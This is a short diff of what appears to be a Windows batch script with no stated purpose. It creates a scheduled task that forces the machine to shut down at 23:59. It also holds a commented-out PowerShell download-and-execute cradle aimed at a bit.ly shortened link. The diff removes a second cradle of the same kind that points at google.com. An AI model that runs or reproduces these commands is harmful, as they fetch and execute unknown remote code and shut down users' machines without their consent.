@@ -7,9 +7,4 @@ SchTasks /Create /TN "Last Task" /TR "shutdown -s -t 0" /SC ONCE /ST 23:59 /SD 2
 #set "location=http://www.bit.ly/1KdMJHq"&echo %location%&powershell "iex(New-Object Net.WebClient).DownloadString(%location%)"
 
 
-
-powershell "iex(New-Object Net.WebClient).DownloadString('http://www.google.com')"
-
-
-
  # %ComSpec%
